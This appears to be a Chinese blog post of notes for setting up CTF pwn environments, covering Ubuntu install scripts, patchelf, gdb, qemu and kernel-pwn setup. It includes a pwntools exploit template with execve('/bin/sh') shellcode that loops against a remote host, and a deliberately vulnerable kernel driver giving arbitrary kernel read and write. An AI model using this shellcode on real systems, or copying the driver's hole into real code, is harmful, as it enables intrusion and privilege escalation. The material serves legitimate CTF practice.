---
title: ctf环境配置
date: 2021-07-21 21:21:25
tags: ['信息安全','设置']
categories: ['信息安全']
sticky: 100
---

# 前言

  为了方便，将CTF的环境配置进行总结，方便日后快速恢复环境等


# PWN环境

  由于一般PWN题目涉及到各种**Glibc**版本，这里搭建多个虚拟机，下面给出主要版本下的虚拟机安装

## ubuntu16.04

  其安装脚本如下所示
  ```bash
#!/bin/sh
set -x

# apt mirror
sudo tee /etc/apt/sources.list <<EOF
deb https://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiverse

deb https://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiverse

deb https://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse

deb https://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse
EOF

# necessary software
sudo add-apt-repository -y ppa:brightbox/ruby-ng \
    && sudo apt-get update \
    && sudo apt-get install -y libffi-dev libsqlite3-dev libbz2-dev liblzma-dev zlib1g-dev tk-dev libncursesw5-dev libgdbm-dev openssl libssl-dev libreadline-dev uuid-dev \
    texinfo \
    patchelf strace \
    gcc gcc-multilib g++-multilib nasm \
    git wget curl xsel \
    qemu-system docker docker-compose

# docker
sudo tee /etc/docker/daemon.json <<EOF
{
    "registry-mirrors":[
        "https://docker.mirrors.ustc.edu.cn",
        "https://registry.docker-cn.com"
    ]
}
EOF
sudo usermod -aG docker ${USER}

# python
wget https://www.python.org/ftp/python/3.8.10/Python-3.8.10.tar.xz \
    && tar -xvf Python-3.8.10.tar.xz -C ~ \
    && rm -rf Python-3.8.10.tar.xz \
    && (cd ~/Python-3.8.10 && mkdir build && cd build && ../configure --enable-shared --exec-prefix=/usr && make -j $(nproc) && sudo make -j $(nproc) install) \
    && sudo update-alternatives --install /usr/bin/python3 python3 /usr/local/bin/python3.8 150 \
    && wget https://bootstrap.pypa.io/get-pip.py \
    && python3 get-pip.py --user \
    && rm -rf get-pip.py \

# gdb
wget http://ftp.gnu.org/gnu/gdb/gdb-9.2.tar.xz \
    && tar -xvf gdb-9.2.tar.xz -C ~ \
    && rm -rf gdb-9.2.tar.xz \
    && (cd ~/gdb-9.2 && mkdir build && cd build && ../configure --with-python=/usr/bin/python3 && make -j $(nproc) && sudo make -j $(nproc) install) \

# neovim
wget -O ~/nvim.appimage https://ghproxy.com/https://github.com/neovim/neovim/releases/download/stable/nvim.appimage \
    && chmod +x ~/nvim.appimage \
    && sudo ln -sf ~/nvim.appimage /usr/bin/vi \
    && mkdir ~/.config/nvim \
    && cat > ~/.config/nvim/init.vim <<EOF
set clipboard+=unnamedplus
set nu
set tabstop=4
set shiftwidth=4
set softtabstop=4
set expandtab
EOF

# git
git config --global user.name "hawk" \
    && git config --global user.email 18801353760@163.com \
    && git config --global core.editor vi

# python
python3 -m pip install -U --force-reinstall pip -i https://pypi.tuna.tsinghua.edu.cn/simple \
    && python3 -m pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple

# pwntools
python3 -m pip install pwntools

# ropper
python3 -m pip install ropper

# pwndbg
git config --global url."https://ghproxy.com/https://github.com/".insteadOf "https://github.com/" \
    && git clone https://github.com/pwndbg/pwndbg.git ~/pwndbg \
    && (cd ~/pwndbg && ./setup.sh) \
    && git config --global --unset url."https://ghproxy.com/https://github.com/".insteadOf \
    && python3 -m pip install pwnlib psutil

# ruby
sudo apt-get update \
    && sudo apt-get install -y ruby2.6 ruby2.6-dev \
    && sudo gem install one_gadget seccomp-tools

```


## ubuntu18.04

  ```bash
#!/bin/sh
set -x

# apt mirror
sudo tee /etc/apt/sources.list <<EOF
deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse

deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse

deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse

deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse
EOF

# necessary software
sudo add-apt-repository -y ppa:brightbox/ruby-ng \
    && sudo apt-get update \
    && sudo apt-get install -y python3 python3-dev python3-pip \
    gdb patchelf strace \
    gcc gcc-multilib g++-multilib nasm \
    git wget curl neovim xsel \
    qemu-system docker docker-compose

# docker
sudo tee /etc/docker/daemon.json <<EOF
{
    "registry-mirrors":[
        "https://docker.mirrors.ustc.edu.cn",
        "https://registry.docker-cn.com"
    ]
}
EOF
sudo usermod -aG docker ${USER}

# neovim
mkdir ~/.config/nvim \
    && cat > ~/.config/nvim/init.vim <<EOF
set clipboard+=unnamedplus
set nu
set tabstop=4
set shiftwidth=4
set softtabstop=4
set expandtab
EOF

# git
git config --global user.name "hawk" \
    && git config --global user.email 18801353760@163.com \
    && git config --global core.editor vi

# python
python3 -m pip install -U --force-reinstall pip -i https://pypi.tuna.tsinghua.edu.cn/simple \
    && python3 -m pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple

# pwntools
python3 -m pip install pwntools

# ropper
python3 -m pip install ropper

# pwndbg
git config --global url."https://ghproxy.com/https://github.com/".insteadOf "https://github.com/" \
    && git clone https://github.com/pwndbg/pwndbg.git ~/pwndbg \
    && (cd ~/pwndbg && ./setup.sh) \
    && git config --global --unset url."https://ghproxy.com/https://github.com/".insteadOf \
    && python3 -m pip install pwnlib psutil

# ruby
sudo apt-get update \
    && sudo apt-get install -y ruby2.6 ruby2.6-dev \
    && sudo gem install one_gadget seccomp-tools

```


## ubuntu20.04

   ```bash
#!/bin/sh
set -x

# apt mirror
sudo tee /etc/apt/sources.list <<EOF
deb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse

deb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse

deb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse

deb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse
EOF

# necessary software
sudo apt-get update \
    && sudo apt-get install -y python3 python3-dev python3-pip \
    gdb patchelf strace \
    ruby ruby-dev \
    gcc gcc-multilib g++-multilib nasm \
    git wget curl neovim \
    qemu-system docker docker-compose

# docker
sudo tee /etc/docker/daemon.json <<EOF
{
    "registry-mirrors":[
        "https://docker.mirrors.ustc.edu.cn",
        "https://registry.docker-cn.com"
    ]
}
EOF
sudo usermod -aG docker ${USER}

# neovim
mkdir ~/.config/nvim \
    && cat > ~/.config/nvim/init.vim <<EOF
set nu
set tabstop=4
set shiftwidth=4
set softtabstop=4
set expandtab
EOF

# git
git config --global user.name "hawk" \
    && git config --global user.email 18801353760@163.com \
    && git config --global core.editor vi

# python
python3 -m pip install -U --force-reinstall pip -i https://pypi.tuna.tsinghua.edu.cn/simple \
    && python3 -m pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple

# pwntools
python3 -m pip install pwntools

# ropper
python3 -m pip install ropper

# pwndbg
git config --global url."https://ghproxy.com/https://github.com/".insteadOf "https://github.com/" \
    && git clone https://github.com/pwndbg/pwndbg.git ~/pwndbg \
    && (cd ~/pwndbg && ./setup.sh) \
    && git config --global --unset url."https://ghproxy.com/https://github.com/".insteadOf \
    && python3 -m pip install pwnlib psutil

# ruby
sudo gem install one_gadget seccomp-tools

```

## ubuntu22.04

   ```bash
#!/bin/sh
set -x

# apt mirror
sudo tee /etc/apt/sources.list <<EOF
deb https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse

deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse

deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse

deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse
deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse
EOF

# necessary software
sudo apt-get update \
    && sudo apt-get install -y python3 python3-dev python3-pip \
    gdb patchelf strace \
    ruby ruby-dev \
    gcc gcc-multilib g++-multilib nasm \
    git wget curl neovim \
    qemu-system docker docker-compose

# gdb
sudo sed -i "s/^kernel.yama.ptrace_scope = 1$/kernel.yama.ptrace_scope = 0/" /etc/sysctl.d/10-ptrace.conf

# docker
sudo tee /etc/docker/daemon.json <<EOF
{
    "registry-mirrors":[
        "https://docker.mirrors.ustc.edu.cn",
        "https://registry.docker-cn.com"
    ]
}
EOF
sudo usermod -aG docker ${USER}

# neovim
mkdir ~/.config/nvim \
    && cat > ~/.config/nvim/init.vim <<EOF
set nu
set tabstop=4
set shiftwidth=4
set softtabstop=4
set expandtab
EOF

# git
git config --global user.name "hawk" \
    && git config --global user.email 18801353760@163.com \
    && git config --global core.editor vi

# python
python3 -m pip install -U --force-reinstall pip -i https://pypi.tuna.tsinghua.edu.cn/simple \
    && python3 -m pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple

# pwntools
python3 -m pip install pwntools

# ropper
python3 -m pip install ropper

# pwndbg
git config --global url."https://ghproxy.com/https://github.com/".insteadOf "https://github.com/" \
    && git clone https://github.com/pwndbg/pwndbg.git ~/pwndbg \
    && (cd ~/pwndbg && ./setup.sh) \
    && git config --global --unset url."https://ghproxy.com/https://github.com/".insteadOf \
    && python3 -m pip install pwnlib psutil

# ruby
sudo gem install one_gadget seccomp-tools

```


# patchelf

  **CTF**的**PWN**类型题目中，会有复杂的动态链接库和依赖关系，我们需要修改这些二进制的信息，使其可以在本地环境下正常运行，可以通过**patchelf**程序进行实现。

## dynamic loader

  如果没有正确的动态载入器，我们会导致程序执行错误或无法找到程序，因此可以通过如下命令修改指定的动态载入器地址
  ```bash
patchelf --set-interpreter [path] [execute]
  ```

## runtime path

  有时程序需要使用特殊的动态链接库，因此其指定了动态链接库的首要查找路径，即**runtime path(rpath)**。我们在本地可以通过修改**rpath**字段的值，从而让其在本地的对应路径下去寻找动态链接库，命令如下
  ```bash
patchelf --set-rpath [path] [execute]
  ```


# LD_*环境变量

  由于程序的动态链接和依赖关系十分的复杂，因此linux本身也提供了一些环境变量，方便进行程序动态链接和依赖的查找和调试

## LD_DEBUG

  实际上通过设置**LD_DEBUG**变量，可以方便的调试程序动态链接的各种过程，比如

 ```bash
LD_DEBUG=libs [execute]
 ```

  终端会输出程序寻找动态库的全过程，然后接着是正常的执行过程。

  **LD_DEBUG**中包含多个可选的值，如**libs**、**symbols**等，可以通过设置**help**值，然后屏幕会输出所有的可选项及其含义。


## LD_LIBRARY_PATH

  类似于前面的**runtime path**，但是优先级次一级。即程序运行前，在查找动态链接库时，会首先在指定的**rpath**路径下查找；然后在指定的**LD_LIBRARY_PATH**路径下查找；最后在系统的默认路径下进行查找

  其命令执行形式如下所示
  ```bash
LD_LIBRARY_PATH=[path] [execute]
  ```

# GDB调试器

  再做*PWN*题目的时候，需要进行相关的调试，这就需要Linux中的**GDB**进行辅助。

## 常用命令

  **GDB**及其插件中提供了大量的操作，方便进行调试程序，在[GDB教程资源](http://www.gnu.org/software/gdb/documentation/)和[pwndbg教程](https://browserpwndbg.readthedocs.io/en/docs/commands/misc/pwndbg/)中有详细的信息，这里简单介绍几个
  1. `starti`，该命令将程序执行到真正的入口处，并停止等待后续**DEBUG**命令
  2. `call [function]`，直接调用`function`函数执行
  3. `break [address] if [condition]`，即当条件`condition`满足时，程序会在执行到`address`时停止
  4. `break *$rebase(address)`，即在装载基地址偏移`address`设立断点
  5. `dprintf *$rebase(address) "%d\n", $rax`，即当执行到`*$rebase(address)`地址处，输出相关的格式信息
  6. `find [/SIZE-CHAR] START-ADDRESS, END-ADDRESS, EXPR1`，即在指定范围内寻找指定值和类型的数据，其中，**SIZE-CHAR**可选*b*、*h*、*w*、*g*，分别表示8bit、16bit、32bit和64bit
  7. `p *(struct s*)(address)`，即将*address*地址处的变量当作**struct s**结构体的指针，并打印出具体的结构体信息
  8. `![command]`，即在gdb中打开**shell**，执行*command*指令

## 命令执行

  除了手动一条一条命令的进行交互，也可以通过命令行，按照提前给定的指令依次执行，如下所示
  ```bash
gdb [file] -ex [command1] -ex [command2] ...
  ```
  之后，gdb加载给定的目标程序，并按照参数顺序，依次在**GDB**中执行参数中传递的命令



# pwntools库

  这是专门用于CTF和漏洞利用的Python库

## PWN模板

  为了方便*PWN*，这里专门给出一个标准脚本，可以稍加修改即可用于任何不同的*PWN*题目
  ```python
#!/usr/bin/python3
# -*- coding:utf-8 -*-
from pwn import *
import sys
import platform

'''
	待修改数据
'''
context.log_level = 'debug'
context.arch = 'amd64'				# 32位使用i386
context.os = 'linux'

execve_file = None
lib_file = None


'''
	使用lambda函数包装pwntools的API，从而使与用户交互的都是str即可
'''
ENCODING = 'ISO-8859-1'
se	= lambda senddata									: r.send(senddata.encode(ENCODING))
sa	= lambda recvdata, senddata, timeout=0x3f3f3f3f						: r.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING), timeout=timeout)
sl	= lambda senddata									: r.sendline(senddata.encode(ENCODING))
sla	= lambda recvdata, senddata, timeout=0x3f3f3f3f						: r.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING), timeout=timeout)
re	= lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f						: (r.recv(numb, timeout=timeout).decode(ENCODING))
ru	= lambda recvdata, timeout=0x3f3f3f3f							: (r.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING))
uu32	= lambda data										: u32((data.ljust(4, '\x00')).encode(ENCODING), signed="unsigned")
uu64	= lambda data										: u64((data.ljust(8, '\x00')).encode(ENCODING), signed="unsigned")
iu32	= lambda data										: u32((data.ljust(4, '\x00')).encode(ENCODING), signed="signed")
iu64	= lambda data										: u64((data.ljust(8, '\x00')).encode(ENCODING), signed="signed")
up32	= lambda data										: (p32(data, signed="unsigned").decode(ENCODING))
up64	= lambda data										: (p64(data, signed="unsigned").decode(ENCODING))
ip32	= lambda data										: (p32(data, signed="signed").decode(ENCODING))
ip64	= lambda data										: (p64(data, signed="signed").decode(ENCODING))



'''
	elf.plt[`symbol`] 获取elf文件中导入符号的plt地址
	elf.got[`symbol`] 获取elf文件中导入符号的got地址
	elf.sym['symbol'] 获取elf文件中本地符号的函数实际地址
'''
if execve_file != None:
	elf = ELF(execve_file)

'''
	lib.sym[`symbol`] 获取lib中符号地址
	next(lib.search('string')) 获取lib中字符串地址
'''
if lib_file != None:
	lib = ELF(lib_file)


'''
	执行爆破攻击
	只有当成功获取shell或者键盘Ctrl+C退出时，程序中止循环
	否则程序一直进行循环
'''

def exp():
	global r
	if 'd' in sys.argv:
		r = process(execve_file)
		gdb.attach(r)	# 断点必须在第一个输入之后
	else:
		r = remote(sys.argv[1], sys.argv[2])

	'''
		这里给出asm 汇编->机器代码的相关样例
	'''
	if context.arch == 'amd64':
		shellcode = asm('''
	mov	rax, %d		/*rbx = "/bin/sh"*/
	push	rax
	mov	rdi, rsp	/*rdi -> "/bin/sh"*/
	xor	esi, esi	/*esi -> NULL*/
	xor	edx, edx	/*edx -> NULL*/
	push	0x3b
	pop	rax		/*rax = 0x3b*/
	syscall			/*execve("/bin/sh")*/
	
	label1:
	mov	rax, [rsp + %d]	/* 测试内存访问 */
	cmp	rax, 1
	je	label1		/* 测试近跳	*/
	'''%(uu64('/bin/sh'), 8)).decode(ENCODING)
	elif context.arch == 'i386':
		shellcode = asm('''
	push	%d		/*"/bin"*/
	push	%d		/*"/sh\x00"*/
	mov	ebx, esp	/*ebx -> "/bin/sh"*/
	xor	ecx, ecx	/*ecx -> NULL*/
	xor	edx, edx	/*edx -> NULL*/
	push	11
	pop	eax		/*eax = 11*/
	int 0x80		/*execve("/bin/sh")*/
	
	label1:
	mov	eax, [esp + %d]	/* 测试内存访问 */
	cmp	eax, 1
	je	label1		/* 测试近跳	*/
	'''%(uu32('/sh'), uu32('/bin'), 4)).decode(ENCODING)

while True:
	try:
		exp()
		sl('cat flag')
		data = ru('}', 1)
		if '{' not in data:
			r.close()
			continue
		else:
			log.info(data)
			break
	except KeyboardInterrupt:
		break
	except:
		continue
```


# Kernel

  kernel pwn中涉及非常琐碎的知识点，这里简单介绍一些

## 文件

### 内核文件

  一般有如下几种内核文件格式
  1. **vmlinux**
	从源码编译出来的，原始内核二进制文件
  2. **bzImage**
	big zImage，也就是更大的zImage。而**zImage**是**vmlinux**经过压缩后的文件，使用[extract-vmlinux脚本](extract-vmlinux)将**zImage**解压为**vmlinux**
	```bash
./extract-vmlinux /path/to/bzImage > /path/to/vmlinux
```
	亦可使用[vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf)，将**bzImage**转换为带符号的**vmlinux**
	```bash
vmlinux-to-elf /path/to/bzImage /path/to/vmlinux
```

### 镜像文件

  即文件系统镜像——简单来说，该文件中保存着一个文件系统的**dump**。只要将该文件映射入内存，即建立了根文件系统所需要的结构信息

  一般名称为**rootfs.cpio**
  使用如下命令将其文件结构导出到当前目录中
  ```bash
cpio -D ${dir} -idv < /path/to/rootfs.cpio
```

  如果想将**${dir}**的目录数据和结构作为内核的根目录，使用如下命令打包成文件系统镜像
  ```bash
(cd ${dir}; find . | cpio -o --format=newc > /path/to/rootfs.cpio)
```

## 结构体

  在编写kernel pwn的exploit时，有时需要某个结构体的字段偏移。
  往往有两种方式
  1. 根据源码手算结构体的偏移。这种方式虽然简单，但是十分容易出错
  2. 编写一个模块，其内容就是计算结构体偏移

对于第二种方式，(默认要计算的结构体在内核不同版本间无变化，否则要先编译对应版本的内核)这里给出编写驱动所需要的**Makefile**、**编译脚本**和**驱动源代码**，可以参照[官方参考链接1](https://docs.kernel.org/kbuild/makefiles.html#loadable-module-goals-obj-m)和[官方参考链接2](https://docs.kernel.org/kbuild/modules.html)

**Makefile**如下所示
```makefile
obj-m	+= hawk.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

  在**Makefile**同目录下执行如下命令
  ```bash
make		#编译驱动
make clean	#清除编译
```

  **驱动源代码**样例如下所示
  ```c
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>
#include <linux/ioctl.h>
#include <linux/random.h>

#define VULN_WRITE		0x1737
#define VULN_READ		0x1738


static int vuln_open(struct inode *inode, struct file *filp);
static long vuln_unlocked_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);


static struct file_operations vuln_fops = {
	open : vuln_open,
	unlocked_ioctl : vuln_unlocked_ioctl,
};


static struct miscdevice vuln_miscdev = {
    .minor      = 11,
    .name       = "vuln",
    .fops       = &vuln_fops,
    .mode	    = 0666,
};

static int vuln_open(struct inode *inode, struct file *filp){
	return 0;
}

typedef struct {
	long long *addr;
	long long val;
} Data;

static long vuln_unlocked_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){

	Data data;
	memset(&data, 0, sizeof(data));

    switch (cmd){

		case VULN_WRITE:

			if(copy_from_user(&data, (Data *)arg, sizeof(data)) != 0)
				return -ENOMEM;

			*(data.addr) = data.val;
			break;
		
		case VULN_READ:

			if(copy_from_user(&data, (Data *)arg, sizeof(data)) != 0)
				return -ENOMEM;

			if(copy_to_user((void*)data.val, data.addr, sizeof(data.val)) != 0)
				return -ENOMEM;
			break;

		default:
			return -ENOTTY;
	}	

    return 0;
}


static int vuln_init(void){
	return misc_register(&vuln_miscdev);
}

static void vuln_exit(void){
	 misc_deregister(&vuln_miscdev);
}

module_init(vuln_init);
module_exit(vuln_exit);
MODULE_LICENSE("GPL");

```



## busybox

前面简单介绍过，**Linux**内核的启动过程，需要根文件系统映像。一般使用[busybox](https://busybox.net/)

其中，通过`make menuconfig`以静态链接方式编译，再通过`make`和`make install`命令，即可在**${busybox}/_install**目录中，构建一个基础的根文件系统。

再通过前面相关内容，即可通过**cpio**命令，生成根文件系统映像


### 创建挂载目录

执行下述命令，创建内核的伪文件系统的挂载点
```bash
mkdir dev etc proc sys
```

### /etc/inittab

根据[init/init.c](https://elixir.bootlin.com/busybox/latest/source/init/init.c)可知，**/linuxrc**会解析/etc/inittab文件，并完成相关的脚本执行。模板配置如下所示
```
::sysinit:/etc/init.d/rcS
::respawn:-/bin/sh
::restart:/sbin/init
```


### /etc/init.d/rcS

根据上面的**/etc/inittab**脚本的内容，其会执行**/etc/init.d/rcS**脚本，初始化内核配置。模板配置如下所示
```bash
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
echo /sbin/mdev > /proc/sys/kernel/hotplug
mdev -s
```

创建该文件后，还需要设置权限为可执行，即执行`chmod +x /etc/init.d/rcS`即可

## qemu

  为了方便调试，一般通过**qemu**模拟运行内核，运行命令如下所示
  ```bash
qemu-system-x86_64 \
 -kernel ${linux}/arch/x86_64/boot/bzImage \
 -initrd /path/to/rootfs.cpio \
 -monitor /dev/null \
 -serial mon:stdio \
 -nographic \
 -append "rdinit=/linuxrc console=ttyS0 oops=panic panic=1 nokaslr" \
 -enable-kvm \
 -smp cores=1,threads=1 \
 -m 128M \
 -cpu kvm64,+smep \
 -no-reboot -no-shutdown \
 -s -S
```

  相关参数的含义通过`man qemu-system`查看，如下所示

  | 参数 | 含义 |
  | :-: | :-: |
  | -m | 虚拟机的内存大小，后缀为'M'或'G' |
  | -kernel | 内核镜像 |
  | -initrd | 文件系统镜像 |
  | -monitor | 重定向Qemu控制台，可以查看虚拟机状态 |
  | -serial mon:dev_string | 当监视器以这种方式多路复用到 **stdio** 时，`Ctrl+C` 将不再终止 QEMU，而是传递给来宾 |
  | -append | kernel的参数，[参考链接](https://docs.kernel.org/admin-guide/kernel-parameters.html)<br>**root**:根文件系统对应的设备，有默认值 <br>**init**:制定内核执行的第一条命令，有默认值 <br>**console**:console对应的设备，一般用**ttyS0**，从而重定向到串口 |
  | -enable-kvm | 开启KVM虚拟化 |
  | -nographic | 关闭Qemu GUI。可以使用-monitor重定向Qemu控制台;-serial重定向guest串口信息; -display重定向guest的GUI |
  | -smp | 设置虚拟机cpu属性 |
  | -cpu | 设置cpu模型信息 |
  | -no-reboot | 当内核崩溃后，静止重启 |
  | -no-shutdown | 当内核崩溃后，冻结在崩溃位置处 |


## 模板

### qemu启动脚本

则本地调试脚本如下所示
  ```bash
#!/bin/sh
set -x

apt_search()
{
    for arg in "$@"
    do
        apt list --installed | grep "$arg";
        if [ ! "$?" = "0" ]; then
            return 1
        fi
    done
    return 0
}

# 根文件系统路径
ROOT=$(pwd)/rootfs

# 文件系统映像路径
ROOTFS=$(pwd)/rootfs.cpio

# 内核镜像路径
KERNEL=$(pwd)/kernel

# exp源代码路径
EXP=$(pwd)/exp.c

# 安装所需要的依赖包
apt_search libkeyutils-dev musl-tools
if [ ! "$?" = "0" ]; then
    sudo apt-get install -y libkeyutils-dev musl-tools
fi

# 静态编译exp
gcc -E -Werror -Wall -o $(pwd)/rootfs/exp.i ${EXP} \
    && musl-gcc -Os -Werror -Wall -static -o $(pwd)/rootfs/exp $(pwd)/rootfs/exp.i -lpthread \
    && strip -s $(pwd)/rootfs/exp \
    && rm -rf $(pwd)/rootfs/exp.i

# 生成文件系统映像
(cd ${ROOT}; find . | cpio -o --format=newc > ${ROOTFS})

# 启动qemu
qemu-system-x86_64 \
    -m 128M \
    -nographic \
    -monitor /dev/null \
    -serial mon:stdio \
    -kernel ${KERNEL}/arch/x86_64/boot/bzImage \
    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr' \
    -initrd ${ROOTFS} \
    -no-shutdown -no-reboot \
    -s
```

### gdb配置文件
```
# .gdbinit
target remote localhost:1234

# 设置kernel基址
set $kernel_base=0xffffffff81000000
set $driver_base=0xffffffffc0000000

add-symbol-file kernel/vmlinux $kernel_base
add-symbol-file driver/vuln.ko $driver_base

```

### exp


#### 系统调用
参考[arch/x86/entry/syscalls/syscall_64.tbl](https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/syscalls/syscall_64.tbl)，使用如下命令`cat arch/x86/entry/syscalls/syscall_64.tbl | awk '{print $3,$2,$1}' | awk '{if(NF==3){print $0}}' | awk '{if($2=="common" || $2=="64" || $2=="x32"){printf "|%-30s|%-6s|%s|\n",$1,$2,$3}}'`，生成64位下的系统调用号

| 系统调用名称 | abi | 系统调用号 |
| :-: | :-: | :-: |
|read                          |common|0|
|write                         |common|1|
|open                          |common|2|
|close                         |common|3|
|stat                          |common|4|
|fstat                         |common|5|
|lstat                         |common|6|
|poll                          |common|7|
|lseek                         |common|8|
|mmap                          |common|9|
|mprotect                      |common|10|
|munmap                        |common|11|
|brk                           |common|12|
|rt_sigaction                  |64    |13|
|rt_sigprocmask                |common|14|
|rt_sigreturn                  |64    |15|
|ioctl                         |64    |16|
|pread64                       |common|17|
|pwrite64                      |common|18|
|readv                         |64    |19|
|writev                        |64    |20|
|access                        |common|21|
|pipe                          |common|22|
|select                        |common|23|
|sched_yield                   |common|24|
|mremap                        |common|25|
|msync                         |common|26|
|mincore                       |common|27|
|madvise                       |common|28|
|shmget                        |common|29|
|shmat                         |common|30|
|shmctl                        |common|31|
|dup                           |common|32|
|dup2                          |common|33|
|pause                         |common|34|
|nanosleep                     |common|35|
|getitimer                     |common|36|
|alarm                         |common|37|
|setitimer                     |common|38|
|getpid                        |common|39|
|sendfile                      |common|40|
|socket                        |common|41|
|connect                       |common|42|
|accept                        |common|43|
|sendto                        |common|44|
|recvfrom                      |64    |45|
|sendmsg                       |64    |46|
|recvmsg                       |64    |47|
|shutdown                      |common|48|
|bind                          |common|49|
|listen                        |common|50|
|getsockname                   |common|51|
|getpeername                   |common|52|
|socketpair                    |common|53|
|setsockopt                    |64    |54|
|getsockopt                    |64    |55|
|clone                         |common|56|
|fork                          |common|57|
|vfork                         |common|58|
|execve                        |64    |59|
|exit                          |common|60|
|wait4                         |common|61|
|kill                          |common|62|
|uname                         |common|63|
|semget                        |common|64|
|semop                         |common|65|
|semctl                        |common|66|
|shmdt                         |common|67|
|msgget                        |common|68|
|msgsnd                        |common|69|
|msgrcv                        |common|70|
|msgctl                        |common|71|
|fcntl                         |common|72|
|flock                         |common|73|
|fsync                         |common|74|
|fdatasync                     |common|75|
|truncate                      |common|76|
|ftruncate                     |common|77|
|getdents                      |common|78|
|getcwd                        |common|79|
|chdir                         |common|80|
|fchdir                        |common|81|
|rename                        |common|82|
|mkdir                         |common|83|
|rmdir                         |common|84|
|creat                         |common|85|
|link                          |common|86|
|unlink                        |common|87|
|symlink                       |common|88|
|readlink                      |common|89|
|chmod                         |common|90|
|fchmod                        |common|91|
|chown                         |common|92|
|fchown                        |common|93|
|lchown                        |common|94|
|umask                         |common|95|
|gettimeofday                  |common|96|
|getrlimit                     |common|97|
|getrusage                     |common|98|
|sysinfo                       |common|99|
|times                         |common|100|
|ptrace                        |64    |101|
|getuid                        |common|102|
|syslog                        |common|103|
|getgid                        |common|104|
|setuid                        |common|105|
|setgid                        |common|106|
|geteuid                       |common|107|
|getegid                       |common|108|
|setpgid                       |common|109|
|getppid                       |common|110|
|getpgrp                       |common|111|
|setsid                        |common|112|
|setreuid                      |common|113|
|setregid                      |common|114|
|getgroups                     |common|115|
|setgroups                     |common|116|
|setresuid                     |common|117|
|getresuid                     |common|118|
|setresgid                     |common|119|
|getresgid                     |common|120|
|getpgid                       |common|121|
|setfsuid                      |common|122|
|setfsgid                      |common|123|
|getsid                        |common|124|
|capget                        |common|125|
|capset                        |common|126|
|rt_sigpending                 |64    |127|
|rt_sigtimedwait               |64    |128|
|rt_sigqueueinfo               |64    |129|
|rt_sigsuspend                 |common|130|
|sigaltstack                   |64    |131|
|utime                         |common|132|
|mknod                         |common|133|
|uselib                        |64    |134|
|personality                   |common|135|
|ustat                         |common|136|
|statfs                        |common|137|
|fstatfs                       |common|138|
|sysfs                         |common|139|
|getpriority                   |common|140|
|setpriority                   |common|141|
|sched_setparam                |common|142|
|sched_getparam                |common|143|
|sched_setscheduler            |common|144|
|sched_getscheduler            |common|145|
|sched_get_priority_max        |common|146|
|sched_get_priority_min        |common|147|
|sched_rr_get_interval         |common|148|
|mlock                         |common|149|
|munlock                       |common|150|
|mlockall                      |common|151|
|munlockall                    |common|152|
|vhangup                       |common|153|
|modify_ldt                    |common|154|
|pivot_root                    |common|155|
|_sysctl                       |64    |156|
|prctl                         |common|157|
|arch_prctl                    |common|158|
|adjtimex                      |common|159|
|setrlimit                     |common|160|
|chroot                        |common|161|
|sync                          |common|162|
|acct                          |common|163|
|settimeofday                  |common|164|
|mount                         |common|165|
|umount2                       |common|166|
|swapon                        |common|167|
